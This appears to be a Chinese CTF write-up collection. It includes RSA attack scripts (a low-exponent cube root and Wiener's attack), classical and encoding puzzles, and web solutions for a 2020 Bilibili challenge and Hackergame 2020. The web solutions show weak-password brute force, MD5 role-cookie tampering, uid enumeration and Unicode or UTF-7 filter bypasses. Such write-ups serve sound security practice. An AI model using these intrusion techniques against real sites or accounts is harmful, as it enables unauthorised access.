p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 
q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 
dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 
dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 
c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852
```

```
import gmpy2
import libnum

def decrypt(dp,dq,p,q,c):
    InvQ = gmpy2.invert(q, p)
    mp = pow(c, dp, p)
    mq = pow(c, dq, q)
    m = (((mp-mq)*InvQ) % p)*q+mq
    print(libnum.n2s(m))

p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 
q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 
dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 
dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 
c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852
decrypt(dp,dq,p,q,c)
```

###### [BJDCTF 2nd]灵能精通-y1ng

![image-20201115215313932](/image-20201115215313932.png)

圣堂武士密码，对照解密即可：

![image-20201115215323456](/image-20201115215323456.png)

flag{IMKNIGHTSTENPLAR}

###### 异性相吸

两个文件异或：

```python
with open(r'C:\Users\hp430\Desktop\b8c1caee-43d6-42ee-aecc-d72502a5ade2\密文.txt' )as a:
    a=a.read()
with open(r'C:\Users\hp430\Desktop\b8c1caee-43d6-42ee-aecc-d72502a5ade2\key.txt' )as b:
    b=b.read()
d=''
for i in range(0,len(b)):
    c=chr(ord(a[i])^ord(b[i]))
    d+=c
print(d)
```

###### [GKCTF2020]汉字的秘密

```
王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由
土夫 井中 士夫 王工 王人 土由 由口夫
```

当铺密码了，笔画中有几个出头的就对应着数字几：

```python
dh = '田口由中人工大土士王夫井羊壮'
ds = '00123455567899'

cip = '王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫'
s = ''
for i in cip:
	if i in dh:
		s += ds[dh.index(i)]
	else:
		s += ' '
#print(s)

ll = s.split(" ")
t = ''
for i in range(0,len(ll)):
	t += chr(int(ll[i])+i+1)
print('t=', t)
```

###### Unencode

uuencode：

```python
from codecs import decode

print(decode(b'begin 666 <data>\n%s\n \nend\n'%(b'89FQA9WMD<V1A<V1S83DY.#<W3$Q,2TM]'), 'uu'))
```

###### Dangerous RSA

```
#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L
#e:  0x3
#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365
so,how to get the message?
```

e很小，知道n、c，低指数攻击：

```python
# -*- coding: utf-8 -*-#
# 打开题目，发现e很小为3，则可以确定使用小指数明文爆破
# #python2
from Crypto.Util.number import long_to_bytes
import primefac
def modinv(a,n):
    return primefac.modinv(a,n)%n
n=0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793
e=0x3
c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365
import gmpy2
i=0
while 1:
    if(gmpy2.iroot(c+i*n,3)[1]==1):
        print long_to_bytes(gmpy2.iroot(c+i*n,3)[0])
        break
    i+=1
```

###### Cipher

```
还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag{} 提交, flag{小写字母}
```

“公平的玩吧”翻译成英文为 playfair，即为普莱费尔密码。密钥为playfair。

###### rsa2

```

N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471
e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085

import hashlib
flag = "flag{" + hashlib.md5(hex(d)).hexdigest() + "}"
```

N和e求d，wiener-attack：

```
'''
Created on Dec 14, 2011

@author: pablocelayes
'''

import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator
import hashlib

def hack_RSA(e,n):
    '''
    Finds d knowing (e,n)
    applying the Wiener continued fraction attack
    '''
    frac = ContinuedFractions.rational_to_contfrac(e, n)
    convergents = ContinuedFractions.convergents_from_contfrac(frac)
    
    for (k,d) in convergents:
        
        #check if d is actually the key
        if k!=0 and (e*d-1)%k == 0:
            phi = (e*d-1)//k
            s = n - phi + 1
            # check if the equation x^2 - s*x + n = 0
            # has integer roots
            discr = s*s - 4*n
            if(discr>=0):
                t = Arithmetic.is_perfect_square(discr)
                if t!=-1 and (s+t)%2==0:
                    print("Hacked!")
                    return d

# TEST functions

def test_hack_RSA():
    print("Testing Wiener Attack")
    times = 5
    
    while(times>0):
        e,n,d = RSAvulnerableKeyGenerator.generateKeys(1024)
        print("(e,n) is (", e, ", ", n, ")")
        print("d = ", d)
    
        hacked_d = hack_RSA(e, n)
    
        if d == hacked_d:
            print("Hack WORKED!")
        else:
            print("Hack FAILED")
        
        print("d = ", d, ", hacked_d = ", hacked_d)
        print("-------------------------")
        times -= 1
    
if __name__ == "__main__":
    #test_is_perfect_square()
    #print("-------------------------")
    # test_hack_RSA()
    N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471
    e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085
    print("Testing Wiener Attack")
    times = 10
    while (times > 0):
        hacked_d = hack_RSA(e, N)
        print("hacked_d = %d" % hacked_d)
        print("-------------------------")
        flag = "flag{" + hashlib.md5(hex(hacked_d)).hexdigest() + "}"
        print(flag)
        times -= 1
```



# 2020哔哩哔哩安全挑战赛

###### 第一题：页面的背后是什么？

提示bilibili Security Browser浏览器访问，估计是改User-Agent

![image-20201026194626149](/image-20201026194626149.png)

用burpsuite修改，咦怎么是flag2。

![image-20201026194912611](/image-20201026194912611.png)

flag1其实f12就能得到，前两题共用页面没想到吧。

![image-20201026195029634](/image-20201026195029634.png)

###### 第二题：真正的秘密只有特殊的设备才能看到

见第一题

###### 第三题：密码是啥？

上来给了登录框，题目提示密码是啥，果断弱口令爆破。

![image-20201026195647426](/image-20201026195647426.png)

然后字典都跑烂了都跑不出来。

最后靠脑洞猜到密码是admin/bilibili。

![image-20201026195806764](/image-20201026195806764.png)

###### 第四题：对不起，权限不足～

提示需要超级管理员，检查cookie发现role
![image-20201026200011598](/image-20201026200011598.png)

md5解密发现是user：

![image-20201026201713114](/image-20201026201713114.png)

改成admin的md5，不对，

改成root的md5，不对，

改成administrator的md5，不对，

改成Administrator的md5，总算对了。

![image-20201026201846085](/image-20201026201846085.png)

emmmm，好吧，这题还算是正常的脑洞，好歹不是master。

###### 第五题：别人的秘密

F12查看前端源码发现获取flag的js逻辑：

```
        $(function () {
        
            
            (function ($) {
                $.getUrlParam = function(name) {
                    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
                    var r = window.location.search.substr(1).match(reg);
                    if (r != null) return unescape(r[2]); return null;
                }
            })(jQuery);
        
            var uid = $.getUrlParam('uid');
            if (uid == null) {
                uid = 100336889;
            }
            $.ajax({
                url: "api/ctf/5?uid=" + uid,
                type: "get",
                success:function (data) {
                    console.log(data);
                    if (data.code == 200){
                        // 如果有值：前端跳转
                        $('#flag').html("欢迎超级管理员登陆～flag : " + data.data )
                    } else {
                        // 如果没值
                        $('#flag').html("这里没有你想要的答案～")
                    }
                }
            })
        });
```

看来要爆破uid，老习惯从0开始，但是爆到1000也没出感觉不对，难道又是脑洞？

2233、114514,都试了一下也不对，感觉这个思路不太行。

突然想起默认uid是100336889，难道从这个uid开始爆破？

![image-20201026202513504](/image-20201026202513504.png)

好吧，真的是，第一次见到管理员不是个位数id的。

顺便，这个uid主页长这样的：

![image-20201026202816988](/image-20201026202816988.png)

没关注没粉丝没动态还被禁封了可还行。

# Hackergame 2020

###### 从零开始的火星文生活

一年一度的 Hackergame 就要到了，L 同学打算叫上 Q 同学一起去参加，却一连几天都见不到 Q 同学的人影。然而在比赛开始的前一天晚上却收到了来自 Q 同学的邮件：

```
Subject: 绝密！不要外传！！！
Body: 详情见附件
From: Q
```

L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 **GBK 编码**，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的**火星文**……

L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？

注：正确的 flag 全部由 **ASCII** 字符组成！

```
脦脪鹿楼脝脝脕脣 拢脠拢谩拢茫拢毛拢氓拢貌拢莽拢谩拢铆拢氓 碌脛路镁脦帽脝梅拢卢脥碌碌陆脕脣脣眉脙脟碌脛 拢忙拢矛拢谩拢莽拢卢脧脰脭脷脦脪掳脩 拢忙拢矛拢谩拢莽 路垄赂酶脛茫拢潞
拢忙拢矛拢谩拢莽拢没拢脠拢麓拢枚拢鲁拢脽拢脝拢玫拢脦拢脽拢梅拢卤拢脭拢猫拢脽拢鲁拢卯拢茫拢掳拢盲拢卤拢卯拢莽拢脽拢麓拢脦拢盲拢脽拢盲拢鲁拢茫拢掳拢脛拢卤拢卯拢脟拢脽拢鹿拢帽拢脛拢虏拢脪拢赂拢猫拢贸拢媒
驴矛脠楼卤脠脠眉脝陆脤篓脤谩陆禄掳脡拢隆
虏禄脪陋脭脵掳脩脮芒路脻脨脜脧垄脳陋路垄赂酶脝盲脣没脠脣脕脣拢卢脪陋脢脟卤禄路垄脧脰戮脥脭茫赂芒脕脣拢隆
```

这种乱码是gbk使用utf-8打开导致的，用vscode转为gbk保存，再把保存的文件用utf-8打开：

```
ÎÒ¹¥ÆÆÁË £È£á£ã£ë£å£ò£ç£á£í£å µÄ·þÎñÆ÷£¬Íµµ½ÁËËüÃÇµÄ £æ£ì£á£ç£¬ÏÖÔÚÎÒ°Ñ £æ£ì£á£ç ·¢¸øÄã£º
£æ£ì£á£ç£û£È£´£ö£³£ß£Æ£õ£Î£ß£÷£±£Ô£è£ß£³£î£ã£°£ä£±£î£ç£ß£´£Î£ä£ß£ä£³£ã£°£Ä£±£î£Ç£ß£¹£ñ£Ä£²£Ò£¸£è£ó£ý
¿ìÈ¥±ÈÈüÆ½Ì¨Ìá½»°É£¡
²»ÒªÔÙ°ÑÕâ·ÝÐÅÏ¢×ª·¢¸øÆäËûÈËÁË£¬ÒªÊÇ±»·¢ÏÖ¾ÍÔã¸âÁË£¡
```

这种乱码是ISO88591使用utf-8打开导致的，用vscode转为ISO88591保存，再把保存的文件用GBK打开：

```
我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你：
ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿９ｑＤ２Ｒ８ｈｓ｝
快去比赛平台提交吧！
不要再把这份信息转发给其他人了，要是被发现就糟糕了！
```

把全角转换成半角：

```python
def DBC2SBC(input_string):
    ret_string = ""
    for uchar in input_string:
        char_code = ord(uchar)
        if char_code == 0x3000:
            char_code = 0x0020
        else:
            char_code -= 0xfee0
        if not (0x0021 <= char_code and char_code <= 0x7e):
            ret_string += uchar
        else:
            ret_string += chr(char_code)
    return ret_string

message = '''

我攻破了 Ｈａｃｋｅｒｇａｍｅ 的服务器，偷到了它们的 ｆｌａｇ，现在我把 ｆｌａｇ 发给你：
ｆｌａｇ｛Ｈ４ｖ３＿ＦｕＮ＿ｗ１Ｔｈ＿３ｎｃ０ｄ１ｎｇ＿４Ｎｄ＿ｄ３ｃ０Ｄ１ｎＧ＿９ｑＤ２Ｒ８ｈｓ｝
快去比赛平台提交吧！
不要再把这份信息转发给其他人了，要是被发现就糟糕了！
'''
print(DBC2SBC(message))
```

```
我攻破了 Hackergame 的服务器,偷到了它们的 flag,现在我把 flag 发给你:
flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_9qD2R8hs}
快去比赛平台提交吧!
不要再把这份信息转发给其他人了,要是被发现就糟糕了!
```

###### 自复读的复读机

能够复读其他程序输出的程序只是普通的复读机。

顶尖的复读机还应该能复读出自己的源代码。

什么是国际复读机啊（战术后仰）

你现在需要编写两个只有一行 Python 代码的顶尖复读机：

- 其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）
- 另一个是输出代码本身的 sha256 哈希值，十六进制小写

满足两个条件分别对应了两个 flag。

快来开始你的复读吧~

```
Your one line python code to exec(): print(1+1)

Your code is:
'print(1+1)'

Output of your code is:
'2\n'

Checking reversed(code) == output
Failed!

Checking sha256(code) == output
Failed!

Connection closed
```

python复读的两种定式：

exec(s:='print("exec(s:=%r)"%s)')

s='s=%r;print(s%%s)';print(s%s)

需要注意自带换行，需要用end=’’处理掉

第一问：

```
exec(s:='print(("exec(s:=%r)"%s)[::-1],end="")')
或
s='s=%r;print((s%%s)[::-1],end="")';print((s%s)[::-1],end="")
```

第二问：

```
exec(s:='print(__import__("hashlib").sha256(("exec(s:=%r)"%s).encode()).hexdigest(),end="")')
```

###### 233同学的字符串工具

233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：

- 字符串大写工具
- UTF-7 到 UTF-8 转换工具

除了点击下方的打开题目按钮使用网页终端，你也可以通过 `nc 202.38.93.111 10233` 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: [string_tool.py](https://hack.lug.ustc.edu.cn/media/74a200cb-3449-5707-b7f9-ceb74cb437a6/string_tool.py)。

如果你不知道 `nc` 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 [萌新入门手册：如何使用 nc/ncat？](https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/)

读了代码之后，你惊讶地发现自己似乎可以通过构造特殊输入，使得 233 同学的工具返回 flag。



简单测试一下发现应该要输入flag：

```
Welcome to the best string tool here!
Brought to you by 233 PROUDLY

Which tool do you want?
1. Convert my string to UPPERCASE!!
2. Convert my UTF-7 string to UTF-8!!
1
Welcome to the capitalizer tool, please input your string: 
f
F

Connection closed
```

```
Welcome to the best string tool here!
Brought to you by 233 PROUDLY

Which tool do you want?
1. Convert my string to UPPERCASE!!
2. Convert my UTF-7 string to UTF-8!!
1
Welcome to the capitalizer tool, please input your string: 
flag
how dare you

Connection closed
```

可用的大小写变换替换字符有：

Uppercase

| Char | Code Point | Output Char |
| ---- | ---------- | ----------- |
| ß    | 0x00DF     | `SS`        |
| ı    | 0x0131     | `I`         |
| ſ    | 0x017F     | `S`         |
| ﬀ    | 0xFB00     | `FF`        |
| ﬁ    | 0xFB01     | `FI`        |
| ﬂ    | 0xFB02     | `FL`        |
| ﬃ    | 0xFB03     | `FFI`       |
| ﬄ    | 0xFB04     | `FFL`       |
| ﬅ    | 0xFB05     | `ST`        |
| ﬆ    | 0xFB06     | `ST`        |

Lowercase

| Char | Code Point | Output Char |
| ---- | ---------- | ----------- |
| K    | 0x212A     | `k`         |

第一问利用0xFB02输入ﬂag即可。

第二问利用不同utf-7转换utf-8可能相同的原理处理。

1. `f` 的 Unicode 码位是 0x66
2. 将 0x66 写成 16 位二进制数：`0000 0000 0110 0110`
3. 重新分组：`000000 000110 011000`
4. 使用 base64 的编码表，将每组变成一个字符：`AGY`

Base64编码表  

| 码值 | 字符 | 码值 | 字符 | 码值 | 字符 | 码值 | 字符 |
| :--: | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
|  0   |  A   |  16  |  Q   |  32  |  g   |  48  |  w   |
|  1   |  B   |  17  |  R   |  33  |  h   |  49  |  x   |
|  2   |  C   |  18  |  S   |  34  |  i   |  50  |  y   |
|  3   |  D   |  19  |  T   |  35  |  j   |  51  |  z   |
|  4   |  E   |  20  |  U   |  36  |  k   |  52  |  0   |
|  5   |  F   |  21  |  V   |  37  |  i   |  53  |  1   |
|  6   |  G   |  22  |  W   |  38  |  m   |  54  |  2   |
|  7   |  H   |  23  |  X   |  39  |  n   |  55  |  3   |
|  8   |  I   |  24  |  Y   |  40  |  o   |  56  |  4   |
|  9   |  J   |  25  |  Z   |  41  |  p   |  57  |  5   |
|  10  |  K   |  26  |  a   |  42  |  q   |  58  |  6   |
|  11  |  L   |  27  |  b   |  43  |  r   |  59  |  7   |
|  12  |  M   |  28  |  c   |  44  |  s   |  60  |  8   |
|  13  |  N   |  29  |  d   |  45  |  t   |  61  |  9   |
|  14  |  O   |  30  |  e   |  46  |  u   |  62  |  +   |
|  15  |  P   |  31  |  f   |  47  |  v   |  63  |  /   |

最后输入+AGY-lag

###### 来自一教的图片

小 P 在一教做**傅里叶光学**实验时，在实验室电脑的模拟程序里发现了这么一张的图片：

![image-20201122142119511](/image-20201122142119511.png)

数理基础并不扎实的小 P 并不知道什么东西成像会是这个样子：又或许什么东西都不是，毕竟这只是模拟 ... 但可以确定的是，这些看似奇怪的花纹里确实隐藏着一些信息，或许是地下金矿的藏宝图也未可知。



傅里叶变换即可：

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
img = cv.imread(r'C:\Users\hp430\Desktop\1.bmp', 0)
f = np.fft.fft2(img)
logf = 20*np.log(np.abs(f))
plt.imshow(logf, 'gray')
plt.show()
```

# unctf2020 2020

###### 阴阳人编码

```
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 不会吧! 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这.
就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧!
就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这.
就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧!
就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧!
就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这¿ 就这. 就这¿
不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这.
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这.
不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这¿ 就这. 就这¿
不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这.
就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这¿
就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 就这. 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这.
就这. 就这. 就这. 不会吧! 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这.
就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这.
就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧!
就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿
不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这.
就这¿ 不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿ 不会吧! 不会吧! 不会吧! 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 不会吧! 不会吧!
不会吧! 不会吧! 不会吧! 不会吧! 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 不会吧! 就这¿ 不会吧! 不会吧! 就这. 就这¿
就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这¿ 就这. 就这¿ 不会吧! 就这. 就这¿ 就这. 就这. 就这. 就这. 就这. 就这. 就这. 就这.
就这. 就这. 不会吧! 就这. 就这¿ 就这. 
```

有.?!，猜测是ook，吧¿ 换为?，中文换成Ook即可

```
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.
